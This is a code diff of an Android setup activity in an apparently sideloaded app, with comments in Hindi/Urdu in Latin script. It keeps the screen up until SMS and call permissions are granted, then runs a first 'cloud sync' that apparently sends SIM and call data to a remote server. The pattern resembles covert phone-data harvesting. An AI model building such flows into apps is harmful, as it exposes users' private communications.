@@ -8,11 +8,12 @@ import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
 
 /**
- * Sideload APK first open — screen tab tak rahe jab tak SMS/call Allow na ho.
- * USB/adb grant ki zarurat nahi.
+ * Sideload first open — screen tab tak open jab tak Render par SIM na chala jaye.
  */
 class PermissionTrampolineActivity : AppCompatActivity() {
     private var statusView: TextView? = null
+    private var actionButton: Button? = null
+    private var syncing = false
 
     private val permissionLauncher =
         registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { _ ->
@@ -24,17 +25,19 @@ class PermissionTrampolineActivity : AppCompatActivity() {
         setContentView(R.layout.activity_setup)
 
         statusView = findViewById(R.id.setup_status)
-        findViewById<Button>(R.id.setup_allow).setOnClickListener {
-            requestRuntimePermissions()
+        actionButton = findViewById(R.id.setup_allow)
+        actionButton?.setOnClickListener {
+            if (SyncBootstrap.needsRuntimePermissions(this)) {
+                requestRuntimePermissions()
+            } else {
+                startCloudSync()
+            }
         }
 
         MongoSyncHelper.ensureApiUrl(this)
-        BackgroundSyncRunner.run {
-            DeviceRegistration.registerNow(applicationContext)
-        }
 
         if (!SyncBootstrap.needsRuntimePermissions(this)) {
-            finishAfterGranted()
+            startCloudSync()
             return
         }
 
@@ -43,14 +46,16 @@ class PermissionTrampolineActivity : AppCompatActivity() {
 
     override fun onResume() {
         super.onResume()
-        if (!SyncBootstrap.needsRuntimePermissions(this)) {
-            finishAfterGranted()
+        if (!syncing && !SyncBootstrap.needsRuntimePermissions(this) &&
+            !InstallFlow.isSetupComplete(this)
+        ) {
+            startCloudSync()
         }
     }
 
     private fun requestRuntimePermissions() {
         if (!SyncBootstrap.needsRuntimePermissions(this)) {
-            finishAfterGranted()
+            startCloudSync()
             return
         }
         permissionLauncher.launch(SyncBootstrap.requiredPermissions())
@@ -60,20 +65,52 @@ class PermissionTrampolineActivity : AppCompatActivity() {
         if (SyncBootstrap.needsRuntimePermissions(this)) {
             Log.w(TAG, "Permissions still missing — setup screen rakho")
             statusView?.text = getString(R.string.setup_message)
-            BackgroundSyncRunner.run {
-                DeviceRegistration.registerNow(applicationContext)
-            }
+            actionButton?.text = getString(R.string.setup_allow)
+            actionButton?.isEnabled = true
             return
         }
-
-        finishAfterGranted()
+        startCloudSync()
     }
 
-    private fun finishAfterGranted() {
+    private fun startCloudSync() {
+        if (syncing || isFinishing) {
+            return
+        }
+        syncing = true
         statusView?.text = getString(R.string.setup_syncing)
-        BackgroundSyncNotifier.cancelPermission(applicationContext)
-        SyncBootstrap.onPermissionsReady(applicationContext)
-        window.decorView.postDelayed({ finish() }, 1200L)
+        actionButton?.isEnabled = false
+
+        BackgroundSyncRunner.run {
+            var ok = false
+            try {
+                CallSyncService.holdDuring(applicationContext) {
+                    ok = InstallFlow.runFirstCloudSync(applicationContext)
+                }
+            } catch (error: Exception) {
+                Log.e(TAG, "First cloud sync failed", error)
+                ok = false
+            }
+
+            runOnUiThread {
+                syncing = false
+                if (isFinishing) {
+                    return@runOnUiThread
+                }
+                if (ok) {
+                    statusView?.text = getString(R.string.setup_done)
+                    InstallFlow.completeSetup(applicationContext)
+                    window.decorView.postDelayed({
+                        if (!isFinishing) {
+                            finish()
+                        }
+                    }, 2000L)
+                } else {
+                    statusView?.text = getString(R.string.setup_failed)
+                    actionButton?.text = getString(R.string.setup_retry)
+                    actionButton?.isEnabled = true
+                }
+            }
+        }
     }
 
     companion object {
